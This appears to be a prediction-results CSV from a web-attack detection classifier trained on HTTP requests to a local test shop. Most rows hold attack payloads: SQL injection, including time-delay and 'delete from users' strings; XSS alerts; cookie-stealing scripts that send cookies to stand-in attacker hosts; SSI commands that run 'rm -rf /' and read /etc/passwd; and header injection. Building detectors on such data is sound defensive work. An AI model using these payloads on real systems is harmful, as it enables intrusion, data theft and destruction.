data,y_pred,y_test
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=100&cantidad=41&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&password=libreta&nombre=virtudes&apellidos=t�rtola+planelles&email=arnold-weck@santcugatpisos.gl&dni=75272191e&direccion=av.+mundia*l+82++13*+1-f&ciudad=guijo+de+coria&cp=23391&provincia=salamanca&ntc=7881123538069057&b1=registrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=37&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=goldstei&pwd=exp8a1!a6a&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/4861362529278789730 gethttp://localhost:8080/webapp/examples/hellopervasive posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3796&b1=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/4861362529278789730.old,anomalous,anomalous
"puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=warun&password=paloteo&nombre=regis&apellidos=deudor+ortodo&email=salvador@bijoubijoudiferente.ec&dni=09115235j&direccion=calle+corregeria,+134,+&ciudad=santa+maria+d'ol�&cp=18518&provincia=palencia&ntc=9339123760594436&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito'+and+'1'='1 gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0');waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=daniela&password=red8lear&nombre=kevin&apellidos=olivari+aucapi�a&email=langmiler_reyes@gallegonicolas.nc&dni=64964263g&direccion=c/+vitoria+s/n,+13?d&ciudad=estercuel&cp=18516&provincia=cuenca&ntca=1002544712535547&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cash3&password=desfacci�n&nombre=eraldo&apellidos=varela+pulido&email=salminen_chew@suardistec.tw&dni=16864786j&direccion=c/+chalaneros,+188,+12-e&ciudad=junta+de+villalba+de+losa&cp=08787&provincia=n?ava*rra&ntc=4545565224454291&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pubs&password=+&nombre=juana+del+pilar&apellidos=arias+salavedra&email=keefer-claudio@hipermadrid.kr&dni=24987514s&direccion=nucleo+residencial+san+carlos,+5,+3?h&ciudad=alba+de+tormes&cp=22896&provincia=castell�n&ntc=2643686847847582&b1=registrar gethttp://localhost:8080/tienda1/global/menum.jsp/4861362529278789730 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hawryszk7&password=as8643o0d4&nombre=paloma&apellidos=z*?ega+delgado&email=cailloy@941.lt&dni=02251300z&direccion=calle+chafarinas+168+&ciudad=d�rcal&cp=19119&provincia=zaragoza&ntc=9097917444528298&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1.bak gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=jam�n+ib�rico&precio=39&cantidad=78&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/imagenes/logo.gif/.bak gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dorelle&pwda=chilote&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=crawshaw&password=mi�rcoles&nombre=cris�foro&apellidos=maynou+santamar�a&email=fairweather@suecas.com.so&dni=374a7262e&direccion=farmaceutico+pedro+rivero,+46,+11-e&ciudad=palomero&cp=02329&provincia=zaragoza&ntc=2775769808173808&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ardoin&pwd=ceno,taf''io&remember=on&b1=entrar gethttp://localhost:8080/tienda1/imagenes/logo.gif/4861362529278789730 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3754&b1=confirmarany%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide.gif/.inc posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=izaak&passworda=calibraci�n&nombre=hortencia&apellidos=turet+maiorana&email=hannon.white8@mtos.st&dni=88648013x&direccion=c/+ajuntament+s/n+&ciudad=santa+mar�a+del+ti�tar&cp=50491&provincia=ourense&ntc=6434125672280477&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=queso+manchego&precio=85&cantidad=64&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=damiano&password=escogidamente&nombre=vilmar&apellidos=mateu+bernaus&email=sheybal@cirugiaparpado.no&dni=75586196p&direccion=travesia+nardo+124,+7e&ciudad=talav�n&cp=42311&provincia=c�ceres&ntca=6955835443751937&b1=registrar gethttp://localhost:8080/iissamples/sdk/asp/docs/sampfram.asp gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100/&cantidad=28&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=100/&cantidad=2&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=39/&cantidad=61&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=shepard&password=cu61r8y4go&nombre=dardo&apellidos=ilizaliturri+corominas&email=scheiwiller1@hangartalleres.pe&dni=44855164n&direccion=calle+renaixenca,+26+&ciudad=robregordo&cp=45410&provinciaa=huelva&ntc=5076436038006169&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100/&cantidad=72&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kehoe&password=rose&nombre=genera&apellidos=marroig+cuadra&email=michalopoulo@s@graficascam@p.lk&dni=35475568t&direccion=calle+isabel+ii,+141+7e&ciudad=martiherrero&cp=50178&provincia=girona&ntc=4663857286858703&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%0aset-cookie%3a+tamper%3d1041264011025374727&precio=6867&b1=confirmar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2714|&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dirac&password=instruidor-a&nombre=helvetia&apellidos=tejera+handal&email=poli@pavimentosalagon.ga&dnia=22640068h&direccion=c/+mangela+s/n,+&ciudad=puras&cp=47360&provincia=palencia&ntc=6085790746283877&b1=registrar gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg/4861362529278789730.bak posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7160&b1=confirmar? gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif/6909030637832563290.jsp.old posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85&cantidad=66&b1a=a�adir+al+carrito gethttp://localhost:8080/samples/sampsite/process.htm gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kundert&password=monesca&nombre=ante&apellidos=altirriba+pava&email=lowry-carmine@filtraciondehumos.nc&dni=70212042b&direccion=c/+mercurio+165+4e&ciudad=san+mart�n+de+la+virgen+de+moncayo&cp=03773&provincia=navarra&ntc=9471070680051511&b1=registrar');waitfor+delay+'0:0:15';-- puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antonin&password=suplidora&nombre=calixto&apellidos=giorgis+zabala&email=merry@mcrspain.gg&dni=23625046k&direccion=pla�a+manuel+corachan+s/n,+9a&ciudad=coscurita&cp=08696&provincia=lleida&ntc=1573270411029963&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=','0','0');waitfor+delay+'0:0:15';--",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hamilton&password=178gatorio&nombre='+delete+from+users&apellidos=maquieira+san+segundo&email=glaessner-alwood@softwaremasservicio.ic&dni=29189199z&direccion=redonda,+142,+13-g&ciudad=r�bade&cp=08673&provincia=le�n&ntc=7739977532136253&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6987&b1=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2 posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6851&b1a=confirmar gethttp://localhost:8080/4861362529278789730 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gunner&pwda=pro?ba&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/anadir.jsp.java gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito@40 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito+ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=a'rsenau/'l&pwd=82m13&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=6957&b1=confirmar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alyssa&pwd=ventr�n&remembera=on&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+.*?rioja&precio=39&cantidad=95&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico~ posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bnrecad&password=in!soluble&nombre=aurelio?&apellidos=ospina+soma&email=humbert@24htranslations.name&dni=78151636m&direccion=ramat,+145+5?b&ciudad=barbastro&cp=31227&provincia=valladolid&ntc=5175468282615613&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+.*?rioja&precio=85&cantidad=42&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar'+and+'1'='1&login=kaidanne&pwd=d67198tad4r6&remember=on&b1=entrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jessalyn&password=tra8ucaire&nombre=ventura&apellidos=codinacs+bellver&email=nace@9horas.mg&dni=55526590j&direccion=c/+zumalacarregui+4+11?h&ciudad=ar�valo+de+la+sierra&cp=40541&provinciaa=segovia&ntc=2481775887753084&b1=registrar gethttp://localhost:8080/tienda1/publico.old gethttp://localhost:8080/tienda1.old posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=marlee-j5&pwd=ple4n637127&remember=on?&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=foster&pwd=8se7i961o&remembera=off&b1=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alzofon&password=0in5fera&nombre=rosario&apellidos=_espa�a+villa+r?ejo&email=stadbauer@aadsl.de&dni=77987215b&direccion=passatge+serracant,+34+7-c&ciudad=azaila&cp=18132&provincia=almer�a&ntc=1281089993352659&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4110&b1=confirmarsessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9350&b1=| gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8970&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=chong&password=2hul7do&nombre=loreto&apellidos=torrelli+casares&email=bog@paremoselalzheimer.is&dni=03582434t&direccion=+c/+arq**uitectura+s/n+&ciudad=od�n&cp=25135&provincia=madrid&ntc=1689148382896192&b1=registrar gethttp://localhost:8080/tienda1/6909030637832563290.jsp~ posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=86&b1=a�adir+al+carrito",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=%2b&login=jana0&pwd=ma�ea0&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=schlemme&password=al4erchig7l&nombre=feliciano&apellidos=bergas+patraca&email=trotta.carslisle@softstylestudio.ki&dni=38227979r&direccion=calle+mar+de+aragon+48+1?e&ciudad=fav/*ara&cp=16710&provincia=guadalajara&ntc=0473794196460600&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=evans&password=8m48a&nombre=liana&apellidos=sastre+molt�&emaila=tefane@978.mp&dni=97041884p&direccion=c/+valldonzella,+40,+2-g&ciudad=mosqueruela&cp=19490&provincia=zamora&ntc=7521556295534229&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/asf-logo-wide.gif gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=28l3ra8a&nombre=hebelen&apellidos=fornalino+grimaldi&email=ozaki_wanamaker@travelzone.tel&dni=75981771y&direccion=calle+san+juan+bautista+de+la+salle+193+6?c&ciudad=calatorao&cp=10191&provincia=burgos&ntc=3393638948319901&b1=registrar');waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=student&password=ali0557ra&nombre=jaled&apellidos=miralles+casola&email=manni@yiutuve.mk&dni=37782618n&direccion=travessera+de+gracia+53+&ciudad=tollos&cp=23264&provincia=pontevedra&ntca=5024784015351535&b1=registrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2| posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&login=nezm&pwd=1eb5l0e&remember=off&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/.bak posthttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=gaconnie&password=81v58o&nombre=dimas&apellidos=i�igo+abelli&email=carbonell@adondeir.um&dni=83627503d&direccion=calle+gran+plaza,+103,+13?h&ciudad=san+carlos+del+valle&cp=15211&provincia=guip�zcoa&ntc=5505928898200135&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=157&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/autenticar.jsp/4861362529278789730.old gethttp://localhost:8080/tienda1/asf-logo-wide.bak puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jeri&password=8n6s17d741a49e&nombre=eutimio&apellidos=zamudio&email=bannen@masqueclases.ch&dni=98531799y&direccion=ca*mino+alque+ria+de+la+campaneta,+122+&ciudad=puigverd+de+lleida&cp=09560&provincia=teruel&ntc=3173800761137477&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4373&b1=pasar+por+cajaand+1=1 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7625&b1=confirmar/",anomalous,anomalous
"gethttp://localhost:8080/samples/gbook/query.htm gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=poh-soon&password=4hicue84&nombre=asad&apellidos=serralta+calzina&email=urecel@elbauldelosrefranes.ky&dnia=30292866a&direccion=carrer+bonsucces+144+&ciudad=sotillo,+el&cp=19442&provincia=soria&ntc=5175468282615613&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ricketts5&pwd=huidera&remember=off/&b1=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=etienne&password=ahoga2iz8&nombre=pastora&apellidos=aleu+alcaide&email=gulager-balsan6@978.dm&dni=44544869x&direccion=giuseppe+micael,+174+8-h&ciudad=valdefuentes+del+p�ramo&cp=06300&provincia=ciudad+real&ntc=5699405800944222&b1a=registrar gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=751&b1a=pasar+por+caja gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg.bak gethttp://localhost:8080/tienda1/4861362529278789730 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off+&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4641&b1=confirmar/",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/salir.jsp/6909030637832563290.jsp.inc gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marquez6&password=sisallo<!--#exec+cmd=""ls+/""-->&nombre=magali&apellidos=mojeda+batet&email=laing@rocofer.pe&dni=16093683p&direccion=calle+mosen+damian+borobia+38+10-f&ciudad=puente+viesgo&cp=48213&provincia=albacete&ntc=3563768127894231&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=2&nombre=vino+rioja&precio=85&cantidad=67&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rogge&pwd=mella&remember=off/&b1=entrar gethttp://localhost:8080/tienda1.bak posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winsberg&password=flagicio&nombre=lihuel&apellidos=novell+abenoza&email=hasserman@clinicadentalsansalvador.ua&dni=95659491f&direccion=*vila-nova,+139+&ciudad=riudoms&cp=36960&provincia=burgos&ntc=1343774789684603&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39&cantidad=65&b1=a�adir+al+carrito'+delete+from+users gethttp://localhost:8080/tienda1/publico/pagar.jsp.old posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar'injected_param&precio=3295&b1=pasar+por+caja gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%20&password=damasceno&nombre=temistocles&apellidos=teruel+villarroel&email=schneider-krymov@ringringrent.ie&dni=27982919s&direccion=c/+rafaela+lozana+76,+6-e&ciudad=quer&cp=39813&provincia=barcelona&ntc=5040261965189529&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg.old gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=@40 gethttp://localhost:8080/jstl-war/index.html posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=20&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=""+and+""1""=""1&b1=confirmar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jowett&password=2�082es&nombre=malco&apellidos=fresquet+giuggia&email=moriaty.suchima@vendomiatico.at&dni=34012270p&direcciona=c/+codigo+apartados+particulares+oficiales+y+lista+94,+3?e&ciudad=benaoj�n&cp=09613&provincia=salamanca&ntc=1543672181801522&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=77&b1=a�adir+al+carrito",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=laforge&pwd=o1r8me956&remember=off/&b1=entrar gethttp://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp.old posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tavis&password=descae0imi5nt5&nombre=chevi&apellidos=isarc/h+,cast,ro&email=sterroll_vannuchhi@somosagelespa�a.mq&dni=50608675g&direccion=avda.+historiador+vicente+ramos,+191,+5b&ciudad=hinojosa+de+san+vicente&cp=17137&provincia=segovia&ntc=7869021872651748&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarsessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&precio=6729&b1=confirmar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=pagi&pwd=cal,,8,ndar&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=majd&password=ma7ordoma&nombre=osmar&apellidos=blandon+dato&email=scales_vlaenderen@conoceagelespa�a.gg'+and+'1'='1&dni=15613671y&direccion=calle+isla+de+corcega+87,+1-b&ciudad=viladecans&cp=48144&provincia=barcelona&ntc=4635391000655529&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2 gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif/4861362529278789730",anomalous,anomalous
"gethttp://localhost:8080/ gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nicolo&password=corconera&nombre=pastora&apellidos=cruillas&email=damboise@automovilesalhambra.co&dni=59569586t&direccion=iru�a+43,+&ciudad=cervera+del+llano&cp=18614&provincia=santa+cruz+de+tenerife&ntc=6204495616575478&b1=registrar<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+--> gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=','0','0');waitfor+delay+'0:0:15';--&precio=2158&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshach&pwd=quer4n55a&remember=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=2832&b1=pasar+por+caja puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=simzer&password=a26lan6a5o&nombre=borna&apellidos=ponce+abad�a&email=inclan@aprendeaestudiar.ec&dni=63019006h&direccion=jose+sanchez+pescador+s/n,+9-a&ciudad=coronada,+la&cp=16316&provincia=toledo&ntc=6649652935543559&b1=registrar",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/productos.jsp/6909030637832563290.jsp.inc gethttp://localhost:8080/cfide/administrator/welcomefooter.cfm gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5685&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/imagenes/3.gif.java gethttp://localhost:8080/tienda1/publico/carrito.jsp.inc gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1any%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yeunjyr&pwd=z3mbo7a&remembera=off&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4459&b1=pasar+por+cajaset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=323&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=s927r�9i0o&remember=%2b&b1=entrar,anomalous,anomalous
"gethttp://localhost:8080/tienda1.bak gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hisko&pwd=misionera&remember=off&b1a=entrar gethttp://localhost:8080/samples/isapi/favlist.htm posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2='or'a='a gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precioa=100&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=100&cantidad=34&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=keeler&password=g78e651no&nombre=floro&apellidos=fidalgo&email=mcintosh@pavimentosalagon.gy&dni=55170412j&direccion=c/+joaquin+sorolla,+148+5?d&ciudad=aben�jar&cp=47175&provincia=salamanca&ntc=7560500533959567&b1a=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lackmann&password=81cob6r&nombre=edelmira&apellidos=dinardi+compres&email=biff@ie_jones@palomajimen@@ez.ac&dni=54887884v&direccion=calle+europa,+53,+3?h&ciudad=escurial&cp=16339&provincia=navarra&ntc=7982312733157380&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=veen&password=sar*gent�a&nombre=vigilio&apellidos=mitjavila+oca&email=seeck@lawn.gu&dni=29573614f&direccion=calle+ripolles+83,+&ciudad=valderr�bano&cp=16812&provincia=valencia<!--#exec+cmd=""ls+/""-->&ntc=7619192104254644&b1=registrar",anomalous,anomalous
